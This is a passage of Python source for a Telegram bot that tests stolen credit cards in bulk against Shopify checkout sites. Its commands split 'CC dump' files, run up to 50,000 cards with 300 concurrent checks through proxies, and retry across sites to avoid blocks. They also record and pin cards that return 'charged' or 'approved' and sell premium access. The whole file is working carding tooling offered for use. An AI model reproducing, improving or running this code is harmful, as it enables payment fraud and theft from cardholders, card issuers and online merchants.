        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/alonechacha")]]
        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙈𝙤𝙙_𝘽𝙮_𝙆𝙖𝙢𝙖𝙡", buttons=buttons)
    
    # Check if user has added proxy
    proxy_data = await get_user_proxy(event.sender_id)
    if not proxy_data:
        return await event.reply("⚠️ 𝙋𝙧𝙤𝙭𝙮 𝙍𝙚𝙦𝙪𝙞𝙧𝙚𝙙!\n\n𝙋𝙡𝙚𝙖𝙨𝙚 𝙖𝙙𝙙 𝙖 𝙥𝙧𝙤𝙭𝙮 𝙛𝙞𝙧𝙨𝙩 𝙪𝙨𝙞𝙣𝙜:\n`/addpxy ip:port:username:password`\n\n𝙊𝙧 𝙬𝙞𝙩𝙝𝙤𝙪𝙩 𝙖𝙪𝙩𝙝:\n`/addpxy ip:port`")
    
    cards = []
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text: cards = extract_all_cards(replied_msg.text)
        if not cards: return await event.reply("𝘾𝙤𝙪𝙡𝙙𝙣'𝙩 𝙚𝙭𝙩𝙧𝙖𝙘𝙩 𝙫𝙖𝙡𝙞𝙙 𝙘𝙖𝙧𝙙𝙨 𝙛𝙧𝙤𝙢 𝙧𝙚𝙥𝙡𝙞𝙚𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚\n\n𝙁𝙤𝙧𝙢𝙚𝙩. /𝙢𝙨𝙝 4111111111111111|12|2025|123 4111111111111111|12|2025|123")
    else:
        cards = extract_all_cards(event.raw_text)
        if not cards: return await event.reply("𝙁𝙤𝙧𝙢𝙚𝙩. /𝙢𝙨𝙝 4111111111111111|12|2025|123 4111111111111111|12|2025|123 4111111111111111|12|2025|123\n\n𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙘𝙤𝙣𝙩𝙖𝙞𝙣𝙞𝙣𝙜 𝙢𝙪𝙡𝙩𝙞𝙥𝙡𝙚 𝙘𝙖𝙧𝙙𝙨")
    if len(cards) > 20:
        cards = cards[:20]
        await event.reply(f"``` ⚠️ 𝙊𝙣𝙡𝙮 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙛𝙞𝙧𝙨𝙩 20 𝙘𝙖𝙧𝙙𝙨 𝙤𝙪𝙩 𝙤𝙛 {len(extract_all_cards(event.raw_text if not event.reply_to_msg_id else replied_msg.text))} 𝙥𝙧𝙤𝙫𝙞𝙙𝙚𝙙. 𝙇𝙞𝙢𝙞𝙩 𝙞𝙨 20 𝙘𝙖𝙧𝙙𝙨 𝙛𝙤𝙧 /𝙢𝙨𝙝.```")
    sites = await load_json(SITE_FILE)
    user_sites = sites.get(str(event.sender_id), [])
    if not user_sites: return await event.reply("𝙔𝙤𝙪𝙧 𝘼𝙧𝙚𝙚 𝙣𝙤𝙩 𝘼𝙙𝙙𝙚𝙙 𝘼𝙣𝙮 𝙐𝙧𝙡 𝙁𝙞𝙧𝙨𝙩 𝘼𝙙𝙙 𝙐𝙧𝙡")
    asyncio.create_task(process_msh_cards(event, cards, user_sites))

async def process_msh_cards(event, cards, sites):
    sent_msg = await event.reply(f"🍳 Checking {len(cards)} cards on Shopify...")

    RETRY_TRIGGERS = [
        "merchandise_expected_price_mismatch", "unable to get payment token", "validation_custom",
        "invalid json response", "delivery_delivery_line_detail_changed", "status: 401", "site error",
        "no working site found", "products", "cloudflare", "bypass failed", "expecting value", "json",
        "401", "positive_amount_expected", "rate limit", "too many requests", "429", "403", "timeout",
        "site requires login", "site not supported", "cart failed with status 503", "connection error",
        "failed to get session token", "payment method not available", "invalid_payment_method",
        "<b>Site Error! Status: 402</b>", "delivery_address", "<b>not shopify!</b>",
        "no valid payment method found", "processing_error", "Cart failed with status 422", 
        "payments_payment_flexibility_terms_id_mismatch", "SITE DEAD", "site dead"
    ]

    for card in cards:
        if not sites:
            await event.reply("❌ No sites available!")
            break

        attempts = 0
        max_attempts = 6
        res = None
        site_index = 0

        while attempts < max_attempts:
            attempts += 1
            res, site_index = await check_card_random_site(card, sites.copy(), event.sender_id)
            response_lower = str(res.get("Response", "")).lower()
            
            if any(trigger.lower() in response_lower for trigger in RETRY_TRIGGERS) and attempts < max_attempts:
                await asyncio.sleep(0.5)
                continue
            break

        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
        
        response_text = str(res.get("Response", "")).lower()
        is_charged = False
        status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"

        if any(x in response_text for x in ["charged", "order placed", "ORDER_PAID", "order completed", "payment successful", "💎", "insufficient_funds"]):
            status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
            is_charged = True
            await save_approved_card(card, "Charged", res.get('Response'), res.get('Gateway'), res.get('Price'))
        elif any(x in response_text for x in ["otp_required", "incorrect_cvc", "requires_action", "3d", "3ds", "approved", "success"]):
            status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅ (3DS)"
            await save_approved_card(card, "APPROVED_3DS", res.get('Response'), res.get('Gateway'), res.get('Price'))

        card_msg = f"""{status_header}

𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝙚𝙬𝙖𝙮 ⇾ {res.get('Gateway', 'Shopify')}
𝗥𝗲𝙨𝙥𝙤𝙣𝙨𝗲 ⇾ {res.get('Response')}
𝗣𝗿𝙞𝙘𝙚 ⇾ {res.get('Price')} 💸

```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝙣𝙠: {bank}
𝗖𝙤𝙪𝙣𝙩𝙧𝙮: {country} {flag}```

𝗧𝗼𝗼𝙺 \~2-4 𝘀𝗲𝙘𝙤𝙣𝙙𝙨"""
        
        await event.reply(card_msg)
        if is_charged:
            await pin_charged_message(event, await event.get_reply_message())

        await asyncio.sleep(1.0)

    await sent_msg.edit(f"✅ Mass Check Completed! Processed {len(cards)} cards.")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]cutfile'))
async def cutfile(event):
    if await is_banned_user(event.sender_id):
        return await event.reply(banned_user_message())
    
    can_access, _ = await can_use(event.sender_id, event.chat)
    if not can_access:
        return await event.reply("Premium/Group only.")

    if not event.reply_to_msg_id:
        return await event.reply("Reply to huge .txt → `/cutfile 40`")

    replied = await event.get_reply_message()
    if not replied.document or not str(replied.file.name).lower().endswith('.txt'):
        return await event.reply("Sirf .txt CC dump file reply kar.")

    try:
        args = event.raw_text.split()
        num_parts = int(args[1]) if len(args) > 1 else 40
        if num_parts < 1 or num_parts > 200:
            num_parts = 40

        loading = await event.reply(f"🔪 Cutting into **{num_parts}** parts...")

        file_path = await replied.download_media()
        async with aiofiles.open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = await f.read()
        os.remove(file_path)

        lines = [line.strip() for line in content.splitlines() if line.strip()]
        total_lines = len(lines)
        lines_per_part = max(1, (total_lines + num_parts - 1) // num_parts)

        sent_count = 0
        for i in range(num_parts):
            start = i * lines_per_part
            end = min(start + lines_per_part, total_lines)
            if start >= total_lines:
                break
            part_lines = []
            for line in lines[start:end]:
                card = extract_card(line)
                if card:
                    part_lines.append(card)
            part_name = f"part_{i+1}_of_{num_parts}_{replied.file.name}"
            part_path = f"/tmp/{part_name}"

            async with aiofiles.open(part_path, "w", encoding="utf-8") as pf:
                await pf.write("\n".join(part_lines) + "\n")

            await event.reply(
                f"📦 **Part {i+1}/{num_parts}** | Lines: {len(part_lines)}/{total_lines}",
                file=part_path
            )
            os.remove(part_path)
            sent_count += 1
            await asyncio.sleep(0.7)  # Safe flood delay

        await loading.edit(f"✅ **Done! Sent {sent_count} parts.**\nTotal lines: {total_lines}\n\nAb har part pe `/mtxt` maar.")

    except ValueError:
        await event.reply("Number of parts daal (e.g. /cutfile 40)")
    except Exception as e:
        await event.reply(f"❌ Error: {str(e)}")
        
@client.on(events.NewMessage(pattern=r'(?i)^[/.]mtxt$'))
async def mtxt(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/alonechacha")]]
        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!", buttons=buttons)
    
    proxy_data = await get_user_proxy(event.sender_id)
    if not proxy_data:
        return await event.reply("⚠️ 𝙋𝙧𝙤𝙭𝙮 𝙍𝙚𝙦𝙪𝙞𝙧𝙚𝙙!\n\n`/addpxy ip:port:username:password`")
    
    user_id = event.sender_id
    if user_id in ACTIVE_MTXT_PROCESSES: 
        return await event.reply("```𝙔𝙤𝙪𝙧 𝘾𝘾 is 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 𝙬𝙖𝙞𝙩 𝙛𝙤𝙧 𝙘𝙤𝙢𝙥𝙡𝙚𝙩𝙚```")
    
    if not event.reply_to_msg_id: 
        return await event.reply("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙙𝙤𝙘𝙪𝙢𝙚𝙣𝙩 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙬𝙞𝙩𝙝 /𝙢𝙩𝙭𝙩```")
    
    replied_msg = await event.get_reply_message()
    if not replied_msg or not replied_msg.document: 
        return await event.reply("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙙𝙤𝙘𝙪𝙢𝙚𝙣𝙩 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙬𝙞𝙩𝙝 /𝙢𝙩𝙭𝙩```")
    
    file_path = await replied_msg.download_media()
    try:
        async with aiofiles.open(file_path, "r", encoding="utf-8", errors="ignore") as f: 
            lines = (await f.read()).splitlines()
        os.remove(file_path)
    except:
        try: os.remove(file_path)
        except: pass
        return await event.reply("❌ Error reading file")
    
    cards = [line.strip() for line in lines if re.match(r'\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', line.strip())]
    if not cards: 
        return await event.reply("𝘼𝙣𝙮 𝙑𝙖𝙡𝙞𝙙 𝘾𝘾 𝙣𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🥲")
    
    cc_limit = get_cc_limit(access_type, user_id)
    if len(cards) > cc_limit and cc_limit > 0:
        cards = cards[:cc_limit]
    
    sites = await load_json(SITE_FILE)
    user_sites = sites.get(str(event.sender_id), [])
    if not user_sites:
        return await event.reply("❌ 𝙎𝙞𝙩𝙚 𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 𝙄𝙣 𝙔𝙤𝙪𝙧 𝘿𝘽\n\nPehle /add ya /addtxtsites se sites add karo!")
    
    ACTIVE_MTXT_PROCESSES[user_id] = True
    asyncio.create_task(process_mtxt_cards(event, cards, user_sites.copy()))

async def process_mtxt_cards(event, cards, local_sites):
    user_id = event.sender_id
    total = len(cards)
    if total > 50000:
        cards = cards[:50000]
        await event.reply("⚠️ **50k MAX LIMIT** - Processing first 50,000 CCs only.")

    checked = approved = charged = declined = 0
    status_msg = await event.reply(f"```🔥 𝙈𝙏𝙓𝙏 𝘾𝙝𝙚𝙘𝙠 𝙎𝙩𝙖𝙧𝙩𝙚𝙙 🍳 {total} 𝘾𝘾𝙎```")

    bin_cache = {}
    semaphore = asyncio.Semaphore(300)  # 300 THREADS MAX - ADDED FOR FULL POWER

    RETRY_TRIGGERS = ["merchandise_expected_price_mismatch", "unable to get payment token", "validation_custom", "invalid json response", "delivery_delivery_line_detail_changed", "status: 401", "site error", "no working site found", "products", "cloudflare", "bypass failed", "expecting value", "json", "DECISION_RULE_BLOCK", "401", "positive_amount_expected", "rate limit", "too many requests", "429", "403", "timeout", "site requires login", "site not supported", "cart failed with status 503", "connection error", "failed to get session token", "payment method not available", "invalid_payment_method", "<b>Site Error! Status: 402</b>", "delivery_address", "<b>not shopify!</b>", "no valid payment method found", "processing_error", "Cart failed with status 422", "payments_payment_flexibility_terms_id_mismatch", "SITE DEAD", "site dead", "<b>Site Error! Status: 429</b>", "proxy error: 503",
"service unavailable", "Cart failed with status 400", "<b>Proxy Error: Server disconnected</b>", "error:", "<b>Site Error! Status: 503</b>",  "<b>Site Error! Status: 401</b>", "HTTP_ERROR_502"]

    # ADDED: Hit tracker to guarantee zero missed results
    hit_cards = set()

    async def check_single_card(card):
        nonlocal checked, approved, charged, declined
        if user_id not in ACTIVE_MTXT_PROCESSES:
            return

        attempts = 0
        max_attempts = 12  # ADDED: Higher attempts for maximum coverage
        sites_tried = set()

        while attempts < max_attempts:
            if user_id not in ACTIVE_MTXT_PROCESSES:
                return
            attempts += 1

            available_sites = [s for s in local_sites if s not in sites_tried]
            if not available_sites:
                sites_tried.clear()
                available_sites = local_sites[:]

            current_site = random.choice(available_sites)
            sites_tried.add(current_site)

            async with semaphore:
                try:
                    result = await check_card_specific_site(card, current_site, user_id)
                    if user_id not in ACTIVE_MTXT_PROCESSES:
                        return

                    checked += 1
                    response_text = str(result.get("Response", "")).lower()

                    should_retry = any(trigger.lower() in response_text for trigger in RETRY_TRIGGERS)
                    if should_retry and attempts < max_attempts:
                        checked -= 1
                        await asyncio.sleep(0.01)
                        continue

                    bin_num = card.split("|")[0]
                    if bin_num not in bin_cache:
                        bin_cache[bin_num] = await get_bin_info(bin_num)
                    brand, bin_type, level, bank, country, flag = bin_cache[bin_num]

                    elapsed_time = round(random.uniform(0.6, 1.8), 2)

                    status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
                    is_hit = False

                    if any(x in response_text for x in ["charged", "order paid", "ORDER_PAID", "order completed", "payment successful", "💎", "insufficient_funds"]):
                        charged += 1
                        status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
                        is_hit = True
                        await save_approved_card(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                    elif any(x in response_text for x in ["otp_required", "incorrect_cvc", "requires_action", "3d", "3ds", "approved", "success", "payment accepted"]):
                        approved += 1
                        status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
                        is_hit = True
                        await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                    else:
                        declined += 1

                    if is_hit:
                        short_site = current_site.replace("https://", "").replace("http://", "").split('/')[0]
                        card_msg = f"""{status_header}

𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝙚𝙬𝙖𝙮 ⇾ {result.get('Gateway', 'Shopify')}
𝗥𝗲𝙨𝙥𝙤𝙣𝙨𝗲 ⇾ {result.get('Response')}
𝗣𝗿𝙞𝙘𝙚 ⇾ {result.get('Price')} 💸
𝗦𝗶𝙩𝗲 ⇾ {short_site}

```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝙣𝙠: {bank}
𝗖𝙤𝙪𝙣𝙩𝙧𝙮: {country} {flag}```

𝗧𝗼𝗼𝙺 {elapsed_time} 𝘀𝗲𝙘𝙤𝙣𝙙𝙨
"""
                        result_msg = await event.reply(card_msg)
                        if "CHARGED" in status_header:
                            await pin_charged_message(event, result_msg)

                    # ADDED: Extra forced hit delivery block - zero miss guarantee
                    if is_hit and card not in hit_cards:
                        hit_cards.add(card)
                        try:
                            await event.reply(f"🚀  {status_header} | {card[:12]}****")
                        except:
                            pass

                    # Live Status
                    price = result.get("Price", "N/A")
                    try:
                        price = f"${float(price):.2f}"
                    except:
                        pass

                    percent = min(round((checked / total) * 100, 1), 100)
                    blocks = 15
                    filled = int((checked / total) * blocks)
                    bar = "█" * filled + "░" * (blocks - filled)

                    status_text = f"""💳 `{card[:12]}****`
╭────────────────────
├  ```📩 Resp ➜ {result.get('Response')}```
├ 💲 {price} 
├ 💎 Charged ➜ {charged}
├ ✅ Approved ➜ {approved}
├ ❌ Declined ➜ {declined}
╰ 📊 {bar} {percent}% ({checked}/{total})
"""
                    buttons = [
                        [Button.inline(f"💎 𝗖𝗛𝗔𝗥𝗚𝗘𝘿 • {charged}", b"none")],
                        [Button.inline(f"✅ 𝗔𝗣𝙋𝗥𝙊𝙑𝙀𝘿 • {approved}", b"none")],
                        [Button.inline("🛑 𝗦𝗧𝗢𝗣", f"stop_mtxt:{user_id}".encode())]
                    ]

                    if checked % 55 == 0 or checked == total:  # Faster updates
                        try:
                            await status_msg.edit(status_text, buttons=buttons)
                        except:
                            pass

                    break

                except Exception:
                    if attempts < max_attempts:
                        await asyncio.sleep(0.01)
                        continue
                    checked += 1
                    declined += 1
                    break

    try:
        tasks = [check_single_card(card) for card in cards]
        await asyncio.gather(*tasks, return_exceptions=True)
        
        if user_id not in ACTIVE_MTXT_PROCESSES:
            await event.reply("⛔ MTXT Stopped.")
            return
        ACTIVE_MTXT_PROCESSES.pop(user_id, None)
        await event.reply(f"**✅ MTXT FINISHED**\nTotal: {total} | Checked: {checked} | Charged: {charged} | Approved: {approved} | Declined: {declined}")

    except Exception as e:
        ACTIVE_MTXT_PROCESSES.pop(user_id, None)
        await event.reply(f"**⚠️ CHECK ENDED**\nTotal: {total} | Checked: {checked} | Charged: {charged} | Approved: {approved} | Declined: {declined}")


@client.on(events.CallbackQuery(pattern=rb"stop_mtxt:(\d+)"))
async def stop_mtxt_callback(event):
    try:
        match = event.pattern_match
        process_user_id = int(match.group(1).decode())
        clicking_user_id = event.sender_id
        
        if clicking_user_id != process_user_id and clicking_user_id not in ADMIN_ID:
            return await event.answer("❌ Sirf apna process stop kar sakte ho!", alert=True)
        
        if process_user_id not in ACTIVE_MTXT_PROCESSES:
            return await event.answer("✅ Already stopped ya nahi chalta tha.", alert=True)
        
        # Force kill
        ACTIVE_MTXT_PROCESSES.pop(process_user_id, None)
        
        await event.answer("🛑 MTXT STOPPED SUCCESSFULLY!", alert=True)
        
        # Optional: Notify in chat
        try:
            await event.respond(f"🛑 <b>MTXT STOPPED by user!</b>", parse_mode='html')
        except:
            pass
            
    except Exception as e:
        await event.answer(f"Error: {str(e)}", alert=True)

@client.on(events.NewMessage(pattern='/info'))
async def info(event):
    if await is_banned_user(event.sender_id): return await event.reply(banned_user_message())
    user = await event.get_sender()
    user_id = event.sender_id
    first_name = user.first_name or "𝙉/𝘼"
    last_name = user.last_name or ""
    full_name = f"{first_name} {last_name}".strip()
    username = f"@{user.username}" if user.username else "𝙉/𝘼"
    has_premium = await is_premium_user(user_id)
    premium_status = "✅ 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝘼𝙘𝙘𝙚𝙨𝙨" if has_premium else "❌ 𝙉𝙤 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝘼𝙘𝙘𝙚𝙨𝙨"
    sites = await load_json(SITE_FILE)
    user_sites = sites.get(str(user_id), [])
    if user_sites: sites_text = "\n".join([f"{idx + 1}. {site}" for idx, site in enumerate(user_sites)])
    else: sites_text = "𝙉𝙤 𝙨𝙞𝙩𝙚𝙨 𝙖𝙙𝙙𝙚𝙙"
    info_text = f"""👤 𝙐𝙨𝙚𝙧 𝙄𝙣𝙛𝙤𝙧𝙢𝙖𝙩𝙞𝙤𝙣

𝙉𝙖𝙢𝙚 ⇾ {full_name}
𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚 ⇾ {username}
𝙐𝙨𝙚𝙧 𝙄𝘿 ⇾ `{user_id}`
𝙋𝙧  𝙞𝙫𝙖𝙩𝙚 𝘼𝙘𝙘𝙚𝙨𝙨 ⇾ {premium_status}

𝙎𝙞𝙩𝙚𝙨 ⇾ ({len(user_sites)}):

```
{sites_text}

```
"""

    await event.reply(info_text)

@client.on(events.NewMessage(pattern='/stats'))
async def stats(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!")

    try:
        premium_users = await load_json(PREMIUM_FILE)
        free_users = await load_json(FREE_FILE)
        user_sites = await load_json(SITE_FILE)
        keys_data = await load_json(KEYS_FILE)

        stats_content = "🔥 BOT STATISTICS REPORT 🔥\n"
        stats_content += "=" * 50 + "\n\n"

        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        stats_content += f"📅 Generated on: {current_time}\n\n"

        stats_content += "👥 USER STATISTICS\n"
        stats_content += "-" * 30 + "\n"

        all_user_ids = set()
        all_user_ids.update(premium_users.keys())
        all_user_ids.update(free_users.keys())
        all_user_ids.update(user_sites.keys())

        total_users = len(all_user_ids)
        total_premium = len(premium_users)
        total_free = total_users - total_premium

        stats_content += f"📊 Total Unique Users: {total_users}\n"
        stats_content += f"💎 Premium Users: {total_premium}\n"
        stats_content += f"🆓 Free Users: {total_free}\n\n"

        if premium_users:
            stats_content += "💎 PREMIUM USERS DETAILS\n"
            stats_content += "-" * 30 + "\n"

            for user_id, user_data in premium_users.items():
                expiry_date = datetime.datetime.fromisoformat(user_data['expiry'])
                current_date = datetime.datetime.now()

                status = "ACTIVE" if current_date <= expiry_date else "EXPIRED"
                days_remaining = (expiry_date - current_date).days if current_date <= expiry_date else 0

                stats_content += f"User ID: {user_id}\n"
                stats_content += f"  Status: {status}\n"
                stats_content += f"  Days Given: {user_data.get('days', 'N/A')}\n"
                stats_content += f"  Added By: {user_data.get('added_by', 'N/A')}\n"
                stats_content += f"  Expires: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}\n"
                stats_content += f"  Days Remaining: {days_remaining}\n"
                stats_content += "-" * 20 + "\n"

        stats_content += "\n🌐 SITES STATISTICS\n"
        stats_content += "-" * 30 + "\n"

        total_sites_count = sum(len(sites) for sites in user_sites.values())
        users_with_sites = len([uid for uid, sites in user_sites.items() if sites])

        stats_content += f"📈 Total Sites Added: {total_sites_count}\n"
        stats_content += f"👤 Users with Sites: {users_with_sites}\n"

        if user_sites:
            stats_content += f"\nSites per User:\n"
            for user_id, sites in user_sites.items():
                if sites:
                    stats_content += f"  User {user_id}: {len(sites)} sites\n"
                    for site in sites:
                        stats_content += f"    - {site}\n"

        stats_content += f"\n🔑 KEYS STATISTICS\n"
        stats_content += "-" * 30 + "\n"

        total_keys = len(keys_data)
        used_keys = len([k for k, v in keys_data.items() if v.get('used', False)])
        unused_keys = total_keys - used_keys

        stats_content += f"🔢 Total Keys Generated: {total_keys}\n"
        stats_content += f"✅ Used Keys: {used_keys}\n"
        stats_content += f"⏳ Unused Keys: {unused_keys}\n"

        if keys_data:
            stats_content += f"\nKeys Details:\n"
            for key, key_data in keys_data.items():
                status = "USED" if key_data.get('used', False) else "UNUSED"
                used_by = key_data.get('used_by', 'N/A')
                days = key_data.get('days', 'N/A')
                created = key_data.get('created_at', 'N/A')
                used_at = key_data.get('used_at', 'N/A')

                stats_content += f"  Key: {key}\n"
                stats_content += f"    Status: {status}\n"
                stats_content += f"    Days Value: {days}\n"
                stats_content += f"    Created: {created}\n"
                if status == "USED":
                    stats_content += f"    Used By: {used_by}\n"
                    stats_content += f"    Used At: {used_at}\n"
                stats_content += "-" * 15 + "\n"

        stats_content += f"\n👑 ADMIN STATISTICS\n"
        stats_content += "-" * 30 + "\n"
        stats_content += f"🛡️ Total Admins: {len(ADMIN_ID)}\n"
        stats_content += f"Admin IDs: {', '.join(map(str, ADMIN_ID))}\n"

        if os.path.exists(CC_FILE):
            try:
                async with aiofiles.open(CC_FILE, "r", encoding="utf-8") as f:
                    cc_content = await f.read()
                cc_lines = cc_content.strip().split('\n') if cc_content.strip() else []
                approved_cards = len([line for line in cc_lines if 'APPROVED' in line])
                charged_cards = len([line for line in cc_lines if 'CHARGED' in line])

                stats_content += f"\n💳 CARD STATISTICS\n"
                stats_content += "-" * 30 + "\n"
                stats_content += f"📊 Total Processed Cards: {len(cc_lines)}\n"
                stats_content += f"✅ Approved Cards: {approved_cards}\n"
                stats_content += f"💎 Charged Cards: {charged_cards}\n"
            except:
                pass

        stats_content += "\n" + "=" * 50 + "\n"
        stats_content += "📋 END OF REPORT 📋"

        stats_filename = f"bot_stats_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        async with aiofiles.open(stats_filename, "w", encoding="utf-8") as f:
            await f.write(stats_content)

        await event.reply("📊 𝘽𝙤𝙩 𝙨𝙩𝙖𝙩𝙞𝙨𝙩𝙞𝙘𝙨 𝙧𝙚𝙥𝙤𝙧𝙩 𝙜𝙚𝙣𝙚𝙧𝙖𝙩𝙚𝙙!", file=stats_filename)

        os.remove(stats_filename)

    except Exception as e:
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧 𝙜𝙚𝙣𝙚𝙧𝙖𝙩𝙞𝙣𝙜 𝙨𝙩𝙖𝙩𝙨: {e}")



@client.on(events.NewMessage(pattern=r'(?i)^[/.]ran$'))
async def ranfor(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/alonechacha")]]
        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙈𝙤𝙙_𝘽𝙮_𝙆𝙖𝙢𝙖𝙡", buttons=buttons)
    
    # Check if user has added proxy
    proxy_data = await get_user_proxy(event.sender_id)
    if not proxy_data:
        return await event.reply("⚠️ 𝙋𝙧𝙤𝙭𝙮 𝙍𝙚𝙦𝙪𝙞𝙧𝙚𝙙!\n\n𝙋𝙡𝙚𝙖𝙨𝙚 𝙖𝙙𝙙 𝙖 𝙥𝙧𝙤𝙭𝙮 𝙛𝙞𝙧𝙨𝙩 𝙪𝙨𝙞𝙣𝙜:\n`/addpxy ip:port:username:password`\n\n𝙊𝙧 𝙬𝙞𝙩𝙝𝙤𝙪𝙩 𝙖𝙪𝙩𝙝:\n`/addpxy ip:port`")
    
    user_id = event.sender_id
    if user_id in ACTIVE_MTXT_PROCESSES: return await event.reply("```𝙔𝙤𝙪𝙧 𝘾𝘾 is 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 𝙬𝙖𝙞𝙩 𝙛𝙤𝙧 𝙘𝙤𝙢𝙥𝙡𝙚𝙩𝙚```")
    try:
        if not event.reply_to_msg_id: return await event.reply("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙙𝙤𝙘𝙪𝙢𝙚𝙣𝙩 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙬𝙞𝙩𝙝 /𝙧𝙖𝙣```")
        replied_msg = await event.get_reply_message()
        if not replied_msg or not replied_msg.document: return await event.reply("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙙𝙤𝙘𝙪𝙢𝙚𝙣𝙩 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙬𝙞𝙩𝙝 /𝙧𝙖𝙣```")
        
        # Load sites from sites.txt
        if not os.path.exists('sites.txt'):
            return await event.reply("❌ 𝙎𝙞𝙩𝙚𝙨 𝙛𝙞𝙡𝙚 𝙣𝙤𝙩 𝙛𝙤𝙪𝙣𝙙! 𝘾𝙤𝙣𝙩𝙖𝙘𝙩 𝙖𝙙𝙢𝙞𝙣.")
        
        async with aiofiles.open('sites.txt', 'r') as f:
            sites_content = await f.read()
            global_sites = [line.strip() for line in sites_content.splitlines() if line.strip()]
        
        if not global_sites:
            return await event.reply("❌ 𝙉𝙤 𝙨𝙞𝙩𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚 𝙞𝙣 𝙨𝙞𝙩𝙚𝙨.𝙩𝙭𝙩! 𝘾𝙤𝙣𝙩𝙖𝙘𝙩 𝙖𝙙𝙢𝙞𝙣.")
        
        file_path = await replied_msg.download_media()
        try:
            async with aiofiles.open(file_path, "r") as f: lines = (await f.read()).splitlines()
            os.remove(file_path)
